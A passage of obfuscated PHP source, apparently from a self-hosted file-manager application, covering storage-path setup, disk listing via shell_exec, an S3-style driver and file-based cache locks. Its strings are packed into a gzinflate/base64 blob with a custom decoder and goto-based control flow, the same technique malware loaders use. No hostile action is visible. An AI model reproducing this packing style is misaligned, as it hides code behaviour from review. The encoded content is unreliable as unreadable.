$¸ÌÙâ«, 3600 * 24 * 30); } } if ($§™î¡ && !$¸ÌÙâ«) { } return $¸ÌÙâ« ? $¸ÌÙâ« : $Ï¡˜Äˆ¬; } public static function hashPathSafe($ÆÙ™¹Õ°, $ƒÏ…§÷ö = true) { $è×šŸáŠ =& $_SERVER[‹è™Ü¸Ñ]; $¨î·ãçú = self::hashPath($ÆÙ™¹Õ°, $ƒÏ…§÷ö); return md5($¨î·ãçú . $è×šŸáŠ[1352] . Model($è×šŸáŠ[825])->get($è×šŸáŠ[826])); } public static function initSystemPath() { $¿‹‹æ¾¶ =& $_SERVER[‹è™Ü¸Ñ]; if (defined($¿‹‹æ¾¶[1353])) { return; } define($¿‹‹æ¾¶[1353], self::systemPath($¿‹‹æ¾¶[191])); define($¿‹‹æ¾¶[1354], self::systemPath($¿‹‹æ¾¶[1355])); define($¿‹‹æ¾¶[1356], self::systemPath($¿‹‹æ¾¶[1357])); define($¿‹‹æ¾¶[1358], self::systemPath($¿‹‹æ¾¶[1359])); IOHistory::bindEvent(); } public static function systemPath($æëÅ‰ ô) { $íÀªÃÙ¶ =& $_SERVER[‹è™Ü¸Ñ]; $°Éß³Å = $íÀªÃÙ¶[1360] . ucfirst($æëÅ‰ ô); $Ö¹Ùé“‰ = Model($íÀªÃÙ¶[825])->get($°Éß³Å); if ($Ö¹Ùé“‰) { return $Ö¹Ùé“‰; } if ($æëÅ‰ ô == $íÀªÃÙ¶[191]) { $Ö¹Ùé“‰ = self::make(Model($íÀªÃÙ¶[879])->systemRootPathAdd($íÀªÃÙ¶[605])); } else { $Ö¹Ùé“‰ = self::systemPath($íÀªÃÙ¶[191]); $Ê–£¯¶— = self::sourceID($Ö¹Ùé“‰); $Ö¹Ùé“‰ = self::make(Model($íÀªÃÙ¶[879])->mkdir($Ê–£¯¶—, $æëÅ‰ ô)); } Model($íÀªÃÙ¶[825])->set($°Éß³Å, $Ö¹Ùé“‰); return $Ö¹Ùé“‰; } public static function systemFolder($ä÷ı“’) { $®é…Ï¿£ = IO_PATH_SYSTEM_SOURCE . $ä÷ı“’; $²˜õø = Cache::get($®é…Ï¿£); if (!$²˜õø) { $‚à¿Öúô = IO::infoFullSimple($®é…Ï¿£); if (!$‚à¿Öúô) { $²˜õø = IO::mkdir($®é…Ï¿£, REPEAT_SKIP); } else { $²˜õø = $‚à¿Öúô[$_SERVER[‹è™Ü¸Ñ][87]]; } Cache::set($®é…Ï¿£, $²˜õø, 3600 * 10); } return $²˜õø; } public static function defaultDriver() { return Model($_SERVER[‹è™Ü¸Ñ][822])->defaultDriver(); } public static function defaultIO() { $¢ìŠ¦ ô =& $_SERVER[‹è™Ü¸Ñ]; $ª©Ç“ªã = self::defaultDriver(); return $¢ìŠ¦ ô[1361] . $ª©Ç“ªã[$¢ìŠ¦ ô[475]] . $¢ìŠ¦ ô[1349]; } public static function defaultDriverInit() { static $ğş”ı· = false; if ($ğş”ı·) { return $ğş”ı·; } $ğş”ı· = IO::init(self::defaultIO()); return $ğş”ı·; } public static function fileTypeList() { $À«Æ”ñ€ =& $_SERVER[‹è™Ü¸Ñ]; $é³Š¾ = $GLOBALS[$À«Æ”ñ€[6]][$À«Æ”ñ€[1362]]; foreach ($é³Š¾ as $÷ĞÙ»Û„ => $ıï•ĞÕ‰) { $™Œ—¾Ä = $À«Æ”ñ€[1363] . $÷ĞÙ»Û„; $…ÓáÛ˜õ = LNG($™Œ—¾Ä); if ($™Œ—¾Ä != $…ÓáÛ˜õ) { $é³Š¾[$÷ĞÙ»Û„][$À«Æ”ñ€[32]] = $…ÓáÛ˜õ; } } return $é³Š¾; } public static function diskList($å§€Äå = true) { $¸ïœÇü = $_SERVER[‹è™Ü¸Ñ][1364]; if ($å§€Äå) { $ï¦¥ĞÆ = Cache::get($¸ïœÇü); if (is_array($ï¦¥ĞÆ)) { return $ï¦¥ĞÆ; } } $ï¦¥ĞÆ = self::diskListGet(); Cache::set($¸ïœÇü, $ï¦¥ĞÆ, 60); return $ï¦¥ĞÆ; } public static function diskListGet() { $ÚÉ±ÖöØ =& $_SERVER[‹è™Ü¸Ñ]; $™İÑ×£ì = array(); if ($GLOBALS[$ÚÉ±ÖöØ[6]][$ÚÉ±ÖöØ[1365]] == $ÚÉ±ÖöØ[1366]) { $ü«Ñ½üË = $ÚÉ±ÖöØ[1367]; for ($·¼€Çç‡ = 0; $·¼€Çç‡ < strlen($ü«Ñ½üË); $·¼€Çç‡++) { $¡Ô²˜ÍÅ = $ü«Ñ½üË[$·¼€Çç‡] . $ÚÉ±ÖöØ[1368]; if (file_exists($¡Ô²˜ÍÅ)) { $™İÑ×£ì[] = $¡Ô²˜ÍÅ; } } return $™İÑ×£ì; } if (!function_exists($ÚÉ±ÖöØ[101])) { $™İÑ×£ì[] = $ÚÉ±ÖöØ[890]; return $™İÑ×£ì; } $¾Á¼ÃÆÇ = explode($ÚÉ±ÖöØ[262], shell_exec($ÚÉ±ÖöØ[1369])); array_shift($¾Á¼ÃÆÇ); array_pop($¾Á¼ÃÆÇ); $‡­µ¡š = array($ÚÉ±ÖöØ[1370], $ÚÉ±ÖöØ[1371], $ÚÉ±ÖöØ[1372], $ÚÉ±ÖöØ[1373], $ÚÉ±ÖöØ[1374], $ÚÉ±ÖöØ[1375], $ÚÉ±ÖöØ[1376], $ÚÉ±ÖöØ[1377]); foreach ($¾Á¼ÃÆÇ as $î­õÕ¡¶) { $á½Ğ²©ª = preg_split($ÚÉ±ÖöØ[1378], $î­õÕ¡¶); $¡Ô²˜ÍÅ = $á½Ğ²©ª[count($á½Ğ²©ª) - 1]; if (!strstr($á½Ğ²©ª[0], $ÚÉ±ÖöØ[1379]) || !$¡Ô²˜ÍÅ) { continue; } $£‹å¹ãİ = rtrim($¡Ô²˜ÍÅ, $ÚÉ±ÖöØ[8]) . $ÚÉ±ÖöØ[8]; if (in_array($£‹å¹ãİ, $‡­µ¡š)) { continue; } $™İÑ×£ì[] = $£‹å¹ãİ; } return $™İÑ×£ì; } public static function isSameDisk($¦ï‘¥¡Å, $ñı¡•Á) { $¬úÉ‹ĞÎ =& $_SERVER[‹è™Ü¸Ñ]; if ($GLOBALS[$¬úÉ‹ĞÎ[6]][$¬úÉ‹ĞÎ[1365]] == $¬úÉ‹ĞÎ[1366]) { return strtolower(substr($¦ï‘¥¡Å, 0, 1)) == strtolower(substr($ñı¡•Á, 0, 1)); } $Ûø»µ£¢ = self::diskList(); $İ­»•—™ = !1; $¸àÖĞˆ¡ = !1; sort($Ûø»µ£¢); $Ûø»µ£¢ = array_reverse($Ûø»µ£¢); $¦ï‘¥¡Å = rtrim($¦ï‘¥¡Å, $¬úÉ‹ĞÎ[8]) . $¬úÉ‹ĞÎ[8]; $ñı¡•Á = rtrim($ñı¡•Á, $¬úÉ‹ĞÎ[8]) . $¬úÉ‹ĞÎ[8]; foreach ($Ûø»µ£¢ as $¶’“®Á¨) { $İ½ãˆ”Ÿ = strlen($¶’“®Á¨); if (!$İ­»•—™ && substr($¦ï‘¥¡Å, 0, $İ½ãˆ”Ÿ) == $¶’“®Á¨) { $İ­»•—™ = $¶’“®Á¨; } if (!$¸àÖĞˆ¡ && substr($ñı¡•Á, 0, $İ½ãˆ”Ÿ) == $¶’“®Á¨) { $¸àÖĞˆ¡ = $¶’“®Á¨; } if ($İ­»•—™ && $¸àÖĞˆ¡) { break; } } return $İ­»•—™ === $¸àÖĞˆ¡; } public static function transferType($²€î¥†æ, $³¦²Ä˜›) { $Ó²å¶¤† =& $_SERVER[‹è™Ü¸Ñ]; $ÊŒ©çµ± = self::driverType($²€î¥†æ); $Š™ˆúö = self::driverType($³¦²Ä˜›); if ($ÊŒ©çµ±[$Ó²å¶¤†[33]] == $Š™ˆúö[$Ó²å¶¤†[33]] && $ÊŒ©çµ±[$Ó²å¶¤†[1380]] == $Š™ˆúö[$Ó²å¶¤†[1380]]) { return $Ó²å¶¤†[1381]; } if ($ÊŒ©çµ±[$Ó²å¶¤†[33]] == $Ó²å¶¤†[923] && $Š™ˆúö[$Ó²å¶¤†[33]] == $Ó²å¶¤†[109]) { return $Ó²å¶¤†[1259]; } if ($ÊŒ©çµ±[$Ó²å¶¤†[33]] == $Ó²å¶¤†[109] && $Š™ˆúö[$Ó²å¶¤†[33]] == $Ó²å¶¤†[923]) { return $Ó²å¶¤†[110]; } return $Ó²å¶¤†[1382]; } public static function driverType($¥´š½®) { $ê˜Ùä°ş =& $_SERVER[‹è™Ü¸Ñ]; $Á¨”±³ = str_replace($ê˜Ùä°ş[1383], $ê˜Ùä°ş[12], strtolower($¥´š½®->getType())); if ($Á¨”±³ == $ê˜Ùä°ş[812] || $Á¨”±³ == $ê˜Ùä°ş[1384] || $Á¨”±³ == $ê˜Ùä°ş[1385]) { $¥´š½® = self::defaultDriverInit(); } else { if ($Á¨”±³ == $ê˜Ùä°ş[1269] || $Á¨”±³ == $ê˜Ùä°ş[1386]) { $¥´š½® = IO::init($¥´š½®->pathParse[$ê˜Ùä°ş[1212]]); } } $Í‘óğ’  = $¥´š½®->path; $Á¨”±³ = str_replace($ê˜Ùä°ş[1383], $ê˜Ùä°ş[12], strtolower($¥´š½®->getType())); if ($Á¨”±³ == $ê˜Ùä°ş[109]) { return array($ê˜Ùä°ş[33] => $ê˜Ùä°ş[109], $ê˜Ùä°ş[1380] => $ê˜Ùä°ş[12], $ê˜Ùä°ş[87] => $Í‘óğ’ , $ê˜Ùä°ş[98] => $¥´š½®); } return array($ê˜Ùä°ş[33] => $ê˜Ùä°ş[923], $ê˜Ùä°ş[1380] => $¥´š½®->pathDriver, $ê˜Ùä°ş[87] => $Í‘óğ’ , $ê˜Ùä°ş[98] => $¥´š½®); } public static function pathDriverType($šÄÅÀ½£) { return $šÄÅÀ½£ ? self::driverType(IO::init($šÄÅÀ½£)) : !1; } public static function pathDriverLocal($ıì”™¥İ) { $òæÑÛôÛ =& $_SERVER[‹è™Ü¸Ñ]; $Áø‚ ªÓ = $ıì”™¥İ ? self::driverType(IO::init($ıì”™¥İ)) : !1; return strtolower($Áø‚ ªÓ[$òæÑÛôÛ[33]]) == $òæÑÛôÛ[109] ? !0 : !1; } public static function allowCover($àÇŸœû, $·êö£¯Ò = true) { $­Æ¼Üü =& $_SERVER[‹è™Ü¸Ñ]; if (is_string($àÇŸœû)) { $àÇŸœû = IO::info($àÇŸœû); } if (!$àÇŸœû || $àÇŸœû[$­Æ¼Üü[33]] == $­Æ¼Üü[78] || $àÇŸœû[$­Æ¼Üü[79]] <= 100) { return !1; } if (isset($àÇŸœû[$­Æ¼Üü[1387]]) || !$àÇŸœû[$­Æ¼Üü[87]]) { return !1; } if (isset($àÇŸœû[$­Æ¼Üü[232]]) && !$àÇŸœû[$­Æ¼Üü[232]]) { return !1; } static $Ä¾Ó›½Ã = false; if (!$Ä¾Ó›½Ã || !$·êö£¯Ò) { $×ğù¬ùë = self::driverType(IO::init($àÇŸœû[$­Æ¼Üü[87]])); $¨µ¬³®• = $×ğù¬ùë[$­Æ¼Üü[98]]; $Ä¾Ó›½Ã = $­Æ¼Üü[196]; if ($×ğù¬ùë[$­Æ¼Üü[33]] == $­Æ¼Üü[109]) { $Ä¾Ó›½Ã = $­Æ¼Üü[1388]; } if ($×ğù¬ùë[$­Æ¼Üü[98]] && is_array($×ğù¬ùë[$­Æ¼Üü[98]]->config)) { $•†§šÜê = $×ğù¬ùë[$­Æ¼Üü[98]]->config; if (isset($•†§šÜê[$­Æ¼Üü[1389]]) && $•†§šÜê[$­Æ¼Üü[1389]]) { $Ä¾Ó›½Ã = $­Æ¼Üü[1388]; } } $ñÏø¤Æ¯ = KodIO::defaultDriver(); if (strtolower($ñÏø¤Æ¯[$­Æ¼Üü[98]]) == $­Æ¼Üü[109] && is_array($ñÏø¤Æ¯[$­Æ¼Üü[6]])) { $¾í Ö›İ = $ñÏø¤Æ¯[$­Æ¼Üü[6]][$­Æ¼Üü[1242]]; if (substr($¾í Ö›İ, 0, 2) == $­Æ¼Üü[1390]) { $¾í Ö›İ = str_replace($­Æ¼Üü[1390], BASIC_PATH, $¾í Ö›İ); } if (substr($àÇŸœû[$­Æ¼Üü[87]], 0, strlen($¾í Ö›İ)) == $¾í Ö›İ) { $Ä¾Ó›½Ã = $­Æ¼Üü[196]; } } } return $Ä¾Ó›½Ã == $­Æ¼Üü[1388] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($ÀË§«Ñ) { parent::__construct($ÀË§«Ñ); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($Ë˜ÑÅü³) { $¨¾Äåü =& $_SERVER[‹è™Ü¸Ñ]; if (substr($Ë˜ÑÅü³, 0, 7) == $¨¾Äåü[313]) { $Ë˜ÑÅü³ = $¨¾Äåü[314] . substr($Ë˜ÑÅü³, 7); } header($¨¾Äåü[175] . $Ë˜ÑÅü³); die; } } goto BİŒ„»ëø; B•ƒ£š´Ôš: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $–Æ ğşÖ =& $_SERVER[‹è™Ü¸Ñ]; if (self::$handle) { return self::$handle; } $ıçÓ¹ó = $GLOBALS[$–Æ ğşÖ[6]][$–Æ ğşÖ[425]]; self::$timeout = $ıçÓ¹ó[$–Æ ğşÖ[895]] ? $ıçÓ¹ó[$–Æ ğşÖ[895]] : 10; $ŠùÔ¤ŠÊ = _get($GLOBALS[$–Æ ğşÖ[6]], $–Æ ğşÖ[896]); $°Ò·Ä×Œ = $ıçÓ¹ó[$–Æ ğşÖ[881]] ? $ıçÓ¹ó[$–Æ ğşÖ[881]] : $–Æ ğşÖ[230]; if ($°Ò·Ä×Œ == $–Æ ğşÖ[21] && $ŠùÔ¤ŠÊ == $–Æ ğşÖ[13]) { $°Ò·Ä×Œ = $–Æ ğşÖ[230]; } switch ($°Ò·Ä×Œ) { case $–Æ ğşÖ[884]: self::$handle = new CacheLockRedis(); break; case $–Æ ğşÖ[885]: self::$handle = new CacheLockMemcached(); break; case $–Æ ğşÖ[21]: self::$handle = new CacheLockDatabase(); break; case $–Æ ğşÖ[230]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($–Æ ğşÖ[897], $–Æ ğşÖ[898]); } return self::$handle; } private static function key($Ó˜ËøÃÖ) { return $_SERVER[‹è™Ü¸Ñ][899] . Cache::key($Ó˜ËøÃÖ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($øô…øÉ = '') { self::$errorMsg = $øô…øÉ; } public static function lockGlobal($ö®¯€Ğ, $ğ„œ‰şş) { return self::lock($ö®¯€Ğ, $ğ„œ‰şş, !0); } public static function lock($±¹ÅˆÅ©, $ÔñÕ•ƒë = false, $¬¢Çãª = false) { $Ä’ò…ßˆ =& $_SERVER[‹è™Ü¸Ñ]; $Å¯†Çòù = self::init(); $ãñÔµºÄ = self::key($±¹ÅˆÅ©); $ÔñÕ•ƒë = $ÔñÕ•ƒë ? $ÔñÕ•ƒë : self::$timeout; $ıÇ’°´ = timeFloat(); $ñÏó³Óñ = $Å¯†Çòù->lock($ãñÔµºÄ, $ÔñÕ•ƒë); $ÈÚ†üâŞ = timeFloat(); if (!$ñÏó³Óñ) { $½˜›“Íù = "\x6c\x6f\x63\x6b\x20\x65\x72\x72\x6f\x72\x3b\153\x65\x79\x3d{$±¹ÅˆÅ©}\x3b\164\151\155\145\75{$ÔñÕ•ƒë}\x3b" . self::$errorMsg . $Ä’ò…ßˆ[74] . get_caller_msg(); $ÁïæíÒŞ = LNG($Ä’ò…ßˆ[900]) . "\x28{$ÔñÕ•ƒë}\163\51\56" . LNG($Ä’ò…ßˆ[901]); $ÁïæíÒŞ .= $Ä’ò…ßˆ[902]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ÁïæíÒŞ = $ÁïæíÒŞ . $Ä’ò…ßˆ[903] . self::$errorMsg; } write_log($Ä’ò…ßˆ[904] . sprintf($Ä’ò…ßˆ[905], timeFloat() - $ıÇ’°´) . $Ä’ò…ßˆ[906] . $½˜›“Íù . $Ä’ò…ßˆ[907] . error_get_last(), $Ä’ò…ßˆ[898]); show_json($ÁïæíÒŞ, !1); } if (!$¬¢Çãª) { self::$lockItem[$ãñÔµºÄ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $”ÈÌĞÛá = number_format(timeFloat() - $ÈÚ†üâŞ, 3); write_log($Ä’ò…ßˆ[908] . $±¹ÅˆÅ© . $Ä’ò…ßˆ[909] . $”ÈÌĞÛá, $Ä’ò…ßˆ[898]); } return $ñÏó³Óñ; } public static function lockGet($ß ü­Ğª) { $©³˜Ò•Å = self::key($ß ü­Ğª); if (self::$lockItem[$©³˜Ò•Å]) { return self::$lockItem[$©³˜Ò•Å]; } return self::init()->lockGet($©³˜Ò•Å); } public static function unlock($ÂÆ¥åÉÒ) { $¦ìôÄ =& $_SERVER[‹è™Ü¸Ñ]; $£°í—± = self::key($ÂÆ¥åÉÒ); self::$lockItem[$£°í—±] = null; self::init()->unlock($£°í—±); if (GLOBAL_DEBUG_LOG_ALL) { write_log($¦ìôÄ[910] . $ÂÆ¥åÉÒ, $¦ìôÄ[898]); } return; } public static function unlockRuntime() { $áğúæï– =& $_SERVER[‹è™Ü¸Ñ]; $ÉÊµÖÒ› = self::init(); $ĞÚ×¨ÒÇ = !1; foreach (self::$lockItem as $µëà—¢— => $ìø½Ã“Ç) { if (!$ìø½Ã“Ç) { continue; } $ÉÊµÖÒ›->unlock($µëà—¢—); if (!$ĞÚ×¨ÒÇ) { $ĞÚ×¨ÒÇ = !0; write_log($áğúæï–[911] . $µëà—¢— . $áğúæï–[74] . get_caller_msg(), $áğúæï–[898]); continue; } write_log($áğúæï–[911] . $µëà—¢—, $áğúæï–[898]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ØŸ±½€¾ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($áğúæï–[912] . $ØŸ±½€¾ . $áğúæï–[913] . ACTION, $áğúæï–[898]); } } public static function fileLock($˜Ñ¸ƒ±Ó) { $¥İñûÚ =& $_SERVER[‹è™Ü¸Ñ]; if (!$GLOBALS[$¥İñûÚ[914]]) { $GLOBALS[$¥İñûÚ[914]] = array(); } $GLOBALS[$¥İñûÚ[914]][$˜Ñ¸ƒ±Ó] = !1; $®§ïâ— = fopen(DATA_PATH . $˜Ñ¸ƒ±Ó . $¥İñûÚ[915], $¥İñûÚ[916]); if (!$®§ïâ—) { return !1; } $GLOBALS[$¥İñûÚ[914]][$˜Ñ¸ƒ±Ó] = $®§ïâ—; if (flock($®§ïâ—, LOCK_EX)) { return !0; } self::unlock($˜Ñ¸ƒ±Ó); show_json($¥İñûÚ[917], !1); return !1; } public static function fileUnlock($¨¦€éİˆ) { $Ó õ º’ =& $_SERVER[‹è™Ü¸Ñ]; $”Õ®‰¤Ğ = $GLOBALS[$Ó õ º’[914]][$¨¦€éİˆ]; if (!$”Õ®‰¤Ğ) { return; } $GLOBALS[$Ó õ º’[914]][$¨¦€éİˆ] = !1; flock($”Õ®‰¤Ğ, LOCK_UN); fclose($”Õ®‰¤Ğ); } public static function fileUnlockAll() { $´ğ ª =& $_SERVER[‹è™Ü¸Ñ]; if (!isset($GLOBALS[$´ğ ª[914]]) || !$GLOBALS[$´ğ ª[914]]) { return; } foreach ($GLOBALS[$´ğ ª[914]] as $î­²âçº => $ïàš¬Â) { if (!$ïàš¬Â) { continue; } $GLOBALS[$´ğ ª[914]][$î­²âçº] = !1; flock($ïàš¬Â, LOCK_UN); fclose($ïàš¬Â); } $GLOBALS[$´ğ ª[914]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $™ı¨èÑÑ =& $_SERVER[‹è™Ü¸Ñ]; $‘²ÂÉ”Ñ = $GLOBALS[$™ı¨èÑÑ[6]][$™ı¨èÑÑ[425]]; self::$cachePath = $‘²ÂÉ”Ñ[$™ı¨èÑÑ[230]][$™ı¨èÑÑ[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($àïÌıØì, $şäÊ¹ = 0) { $ÒŒİêÏÉ =& $_SERVER[‹è™Ü¸Ñ]; $ó•ê«“‘ = microtime(!0); $úæÜ“Ï« = $ó•ê«“‘ + $şäÊ¹ + 0.0001; $ô»²©Ç¨ = rtrim(self::$cachePath, $ÒŒİêÏÉ[8]) . $ÒŒİêÏÉ[918] . md5($àïÌıØì) . $ÒŒİêÏÉ[915]; if (file_exists($ô»²©Ç¨) && filemtime($ô»²©Ç¨) && filemtime($ô»²©Ç¨) < time() - 10) { @unlink($ô»²©Ç¨); } do { if (file_exists($ô»²©Ç¨)) { cacheLockWait(); continue; } $©ÕŒõÁ› = fopen($ô»²©Ç¨, $ÒŒİêÏÉ[919]); if (!$©ÕŒõÁ›) { return !1; } $ï‹îÜÀ = flock($©ÕŒõÁ›, LOCK_EX | LOCK_NB); self::$caches[$àïÌıØì] = array($ÒŒİêÏÉ[920] => $©ÕŒõÁ›, $ÒŒİêÏÉ[230] => $ô»²©Ç¨); fwrite($©ÕŒõÁ›, $úæÜ“Ï«); clearstatcache(); if ($©ÕŒõÁ› && $ï‹îÜÀ) { return !0; } cacheLockWait(); } while (microtime(!0) < $úæÜ“Ï«); $this->unlock($àïÌıØì); return !1; } public function lockGet($¥²¸‚Å°) { $ƒ«óí¿¨ =& $_SERVER[‹è™Ü¸Ñ]; $å­ºÕ‘ = rtrim(self::$cachePath, $ƒ«óí¿¨[8]) . $ƒ«óí¿¨[918] . md5($¥²¸‚Å°) . $ƒ«óí¿¨[915]; return file_exists($å­ºÕ‘); } public function unlock($˜‡‹æÙÚ) { $Î¨²ğ·É =& $_SERVER[‹è™Ü¸Ñ]; $ÏÇÇÇµÂ = self::$caches[$˜‡‹æÙÚ]; if (!$ÏÇÇÇµÂ) { return; } @flock($ÏÇÇÇµÂ[$Î¨²ğ·É[920]], LOCK_UN); @fclose($ÏÇÇÇµÂ[$Î¨²ğ·É[920]]); @unlink($ÏÇÇÇµÂ[$Î¨²ğ·É[230]]); unset(self::$caches[$˜‡‹æÙÚ]); } } goto FÖôˆà§; b‹ô¡–ò‘ì: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\213\350\231\334\270\321", "\xaa\xbf\xac\xb1\xfb\x84"); $_SERVER[‹è™Ü¸Ñ] = explode("\x7c\x4\x7c\x3\x7c\x4", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\x7d\x9\x78\x1b\xd5\xd5\x68\xa1\x14\x4a\x28\xcb\x5f\x28\x50\xa0\x65\x30\x49\x6c\x27\x5a\x6c\x67\x77\xe2\x4\xd9\x96\x6d\x25\xb2\x65\x24\x39\xb\xb6\x99\x8c\xa5\xb1"."\65\261\244\121\64\43\157\111\200\204\20\326\260\23\110\330\272\260\267\111\240\24\10\113\200\307\116\201\277\54\155\50\245\264\24\142\47\24\50\224\226\45\145\351\273\313\271\313\214\144\370\337".base64_decode('9973vXxJdO+5y9zl3HPOPffcc5+88YVffnn76gNWf3v1AZ98+MRt179Iw6v3W73/6gNp+A==')."\304\13\277\373\55\362\347\310\13\57\250\250\150\231\71\141\152\333\367\56\371\365\126\355\227\332\35\332\205\221\360\163\317\207\16\375\357\137\56\14\216\375\374\271\341\261\375\276\365\356\167\266"."\x1f\x5b\x8b\x32\xd3\xb2\xb5\xf4\x47\xc9\x9a\xb6\xa2\xf\x19\x96\x6d\x51\x40\xc2\xcc\xf6\x1a\x7d\x34\x6c\x64\xe9\xaf\x9f\xfe\x74\x44\xc3\x79\x3d\x63\xda\x3a\x8d\xfa\xe8\x8f\xa\xed\x22\xff\x5b\x2b\xd3\x6\x4b"."\127\333\42\161\65\326\321\336\36\214\306\41\123\255\234\236\61\223\20\312\151\171\55\3\337\317\351\171\13\265\106\256\116\315\231\71\75\353\200\10\100\122\263\265\36\315\202\232\32\353\325\306"."\x60\x7b\x38\xb2\x4c\x8d\x2f\x6b\xf\x42\x8e\x1e\x75\x65\x41\xcf\xf\xd3\x18\x9\xc6\x6c\x2d\x6f\xc7\x8d\x8c\xce\x73\xc\xe6\x79\xbb\xea\x83\xcd\xa1\x36\x25\x1e\xd\xb4\xc5\x2\xd\xf1\x50\xa4\x8d\x82\x1b\x22"."\255\255\241\170\61\74\32\11\207\353\3\15\213\212\123\332\243\201\346\326\200\202\332\227\326\125\43\333\153\126\50\313\151\312\162\245\222\6\232\14\75\235\244\301\254\306\232\143\17\347\40\24"."\xe7\x21\x34\x4d\xd9\x42\x3a\x4d\x23\x6d\x3c\x94\xd4\x7b\xb5\x42\x1a\x46\xab\x51\x8e\xe4\xf2\x46\x46\x63\x9d\x5e\xa4\xf\x73\x28\xd\x68\x5\xdb\x34\xb2\x9\x1a\x9\xe\xd9\x79\x4d\xc0\x51\x5b\x13\x68\xa2\xf5".base64_decode('LFQVC4aDDXEFN1BpikZaFZiEjGbZel5Z0hKMBhXc6Lpy0tdyBfClDQ2FEgiHlfFqsPVMjg==')."\x55\x43\xcb\x94\xa8\x2c\x12\x6d\xc\x46\x95\xfa\x65\x8a\x18\xa1\x84\x99\xc9\x98\x59\x1f\xaa\x5\xcd\xa4\x2d\x35\x35\x18\x8d\xd2\x80\x7\xd0\x3b\x1c\xc2\x93\x6\x91\x48\x53\x53\x2c\xc8\x63\xd0\xb9\x53\xc3\xa8"."\x25\xd3\x0\x3f\x1d\xb1\x64\x6f\xda\x56\x7\xb4\x74\x81\xa1\x69\x3f\xfd\x2d\x87\x1f\xf8\x35\x2d\x40\xdd\x95\x46\xd6\x28\x0\x9a\x42\x15\xa6\xc9\x97\x15\x4\xa\x2c\xb7\xce\x20\x7a\x12\x2\x19\x54\xde\x84\x72"."\75\0\353\141\271\126\260\200\201\126\350\0\15\326\315\247\277\163\241\174\217\212\323\364\274\255\352\331\204\231\64\262\260\216\27\0\76\152\166\252\61\157\240\14\64\336\153\246\223\54\154\31"."\43\320\313\136\43\255\267\25\62\162\26\36\115\244\214\164\62\317\226\336\327\345\244\321\60\137\311\70\257\210\345\120\113\70\21\60\172\207\305\122\304\371\332\171\252\145\26\362\11\75\204\226".base64_decode('Do1XA1i3bdQ5NiBmRy5tasmYnuddM8wmVFGkYMvAAsnWZOYzjYhowPfRgjE6SiT0syWTlA==')."\x46\xcc\x5f\xd1\xb9\xd6\xfb\x55\x77\xe7\x29\xe8\xbf\x4a\xa0\x8a\x5d\xd0\xa6\x94\x9e\x4e\xab\xfa\x90\xe\x6b\x2a\x93\x9c\x61\xb1\xc1\xf0\x5b\x3d\x46\xd6\x8f\x20\x34\x1a\x8a\xa8\x29\xcd\x4a\xb5\x26\x67\xa8\xa4"."\x14\x23\xb6\x49\x7d\xc8\x97\x4b\xe5\x60\xc1\xf3\x35\xde\xe5\xc0\x79\x3c\x74\x6d\xa6\x1d\x94\x48\x76\xda\x4c\x68\x69\xb9\x8b\x34\x9c\xb2\xed\x5c\x4c\xcf\x26\xf1\x48\x40\x57\xcc\xc1\x2c\x19\xa9\x9c\xae\x43\xa6"."\106\217\222\124\132\225\145\112\113\255\121\153\261\202\231\64\17\261\336\161\230\305\201\366\20\233\316\144\57\140\53\343\30\145\360\101\303\42\304\117\254\134\55\227\113\33\11\315\66\314\254\337"."\114\330\272\355\265\354\274\256\101\215\201\104\102\267\54\157\203\231\265\363\146\332\33\110\247\315\101\157\44\157\364\31\331\132\145\12\320\141\224\210\326\273\27\323\306\132\130\304\145\163\25\214"."\x38\xf8\x33\x53\xea\xa\x76\xaf\x77\x36\x5b\x9c\x3c\x77\x5e\xcb\x5a\xbd\x7a\xde\x1b\x84\x95\x51\xab\xa0\xc6\x72\x2\xc9\xb2\x35\x1a\x56\xce\xb4\xc\xdc\xbc\x5a\x45\xb3\x6d\x2d\x91\xc2\xc4\x45\x54\x5f\xf7\x35"."\371\215\154\332\310\352\305\171\121\45\272\267\75\257\365\145\264\132\45\127\350\101\3\0\13\22\140\11\234\103\316\14\3\120\253\144\264\41\257\326\307\152\12\16\345\214\274\156\261\136\53\315"."\255\161\300\250\136\157\53\136\110\206\236\364\306\20\365\206\312\246\125\115\127\20\256\50\54\215\102\133\342\361\166\65\324\204\330\163\133\120\155\15\304\33\132\240\166\133\353\143\125\207\21\115"."\346\125\62\340\122\57\132\120\30\233\332\120\347\4\260\335\34\324\363\350\303\365\303\265\112\277\231\354\61\207\174\54\11\147\216\41\312\302\62\343\371\315\331\336\250\226\355\303\335\350\31\266".base64_decode('dctNm+oRM/f10tXr69F7zTz0xhrocw5+WM/22SlWdywYXRyMqrFIU3xJIAq8P4swZ4i1Bg==').base64_decode('fz3tjepJNIgJm5XTcmL0l3rxgsEfZ6l4EbG0cKgZj12j10KZvHIuVnfYyBi4ezZPIYONBA==').strrev('•G(ºt'."\n".'ÒĞÅI#´©š©©Z¯µD7à^éMôjìì©OÿEéZœ•ÑRšË®¹ôŸhfƒ')."\x59\xe4\x1c\x16\x81\xe1\x59\x33\xab\x97\x5c\x58\x8\x91\x4c\x4b\xf7\xb6\xe8\x1a\x22\xd2\x68\x22\x1c\xf3\xe2\x61\xdf\xa2\xf1\xaf\x19\x5d\xcc\x2b\x25\x5a\xe2\x9a\x17\xa\x8c\x6\x4f\xed\x8\xc6\xe2\x6a\x6b\x30"."\336\22\151\204\346\